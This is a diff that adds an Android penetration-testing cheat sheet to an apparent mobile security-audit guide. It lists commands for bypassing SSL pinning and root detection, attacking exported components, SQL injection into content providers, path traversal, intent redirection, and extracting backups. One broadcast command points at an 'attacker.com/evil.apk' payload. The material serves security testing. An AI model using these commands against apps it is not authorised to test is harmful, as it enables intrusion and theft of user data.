@@ -785,3 +785,108 @@ A concise paragraph summarising the most impactful findings and recommended firs
 
 - `references/secret-patterns.md` — Full grep/ripgrep pattern list for secret hunting with regex, tool commands, and severity ratings
 - `references/owasp-mobile-top10.md` — OWASP Mobile Top 10 and MASVS category reference with remediation guidance
+
+
+---
+
+## From hack-skills: Android Pentesting Tricks
+
+### SSL Pinning Bypass
+
+```bash
+# 1. Frida universal bypass:
+adb push frida-server /data/local/tmp/
+adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"
+frida -U -l ssl_pinning_bypass.js -f com.target.app --no-pause
+
+# 2. Objection (quickest):
+objection -g com.target.app explore
+# REPL: android sslpinning disable
+
+# 3. Magisk modules: TrustMeAlready (LSPosed) for system-wide bypass
+#    MagiskTrustUserCerts for Burp CA in system store
+```
+
+**Hook points**: `X509TrustManager.checkServerTrusted`, `OkHttpClient.Builder.sslSocketFactory`, `CertificatePinner.check`, `WebViewClient.onReceivedSslError`
+
+### Exported Component Attacks
+
+```bash
+# Find exported components:
+aapt dump xmltree target.apk AndroidManifest.xml | grep -B 5 "exported.*true"
+
+# Launch exported activity:
+adb shell am start -n com.target.app/.AdminActivity
+adb shell am start -n com.target.app/.DeepLinkActivity -d "target://cb?token=attacker"
+
+# SQL injection in content provider:
+adb shell content query --uri "content://com.target.app.provider/users" \
+  --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"
+
+# Path traversal in file provider:
+adb shell content read --uri "content://com.target.app.fileprovider/../../../../etc/hosts"
+
+# Send crafted broadcast:
+adb shell am broadcast -a com.target.app.ACTION_UPDATE --es "url" "http://attacker.com/evil.apk"
+```
+
+### WebView Vulnerabilities
+
+| Vulnerability | Condition | Exploit |
+|---|---|---|
+| `setJavaScriptEnabled(true)` + JS interface | Pre-API 17 | Reflection RCE via `android.getClass()` |
+| `setAllowFileAccessFromFileURLs(true)` | file:// reads other file:// | Load `file:///data/data/com.target/...` |
+| `setAllowUniversalAccessFromFileURLs(true)` | file:// accesses any origin | XHR exfil to attacker |
+| `loadUrl(user_controlled)` | User input in loadUrl | `javascript:` or `file://` |
+
+### Intent Redirection
+
+```java
+// Vulnerable pattern:
+Intent redirect = (Intent) getIntent().getParcelableExtra("next_intent");
+startActivity(redirect);  // attacker controls next_intent → starts any internal activity
+```
+
+```bash
+# Exploit via adb:
+adb shell am start -n com.target.app/.ExportedActivity \
+  --es "next_intent" "intent:#Intent;component=com.target.app/.InternalAdminActivity;end"
+```
+
+### Root Detection Bypass
+
+```bash
+# Frida hooks:
+# Hook File.exists() → return false for su binary paths
+# Hook Build.TAGS → return "release-keys"
+# Hook PackageManager.getPackageInfo → throw NameNotFoundException for Magisk
+
+# Magisk DenyList: hides root from target app completely
+# Shamiko module: advanced root hiding
+
+# Debug build shortcut:
+adb shell run-as com.target.app   # if android:debuggable=true
+# → full access to /data/data/com.target.app/
+```
+
+### Backup Extraction
+
+```bash
+# Check if backup allowed (true by default!):
+aapt dump xmltree target.apk AndroidManifest.xml | grep allowBackup
+
+# Extract:
+adb backup -f backup.ab -apk com.target.app
+dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
+tar xf backup.tar
+
+# Analyze: check shared_prefs/*.xml for tokens, databases/*.db for sensitive data
+```
+
+### Drozer Testing
+
+```bash
+dz> run app.package.attacksurface com.target.app
+dz> run scanner.provider.injection -a com.target.app
+dz> run app.provider.query content://com.target.app.provider/users
+```
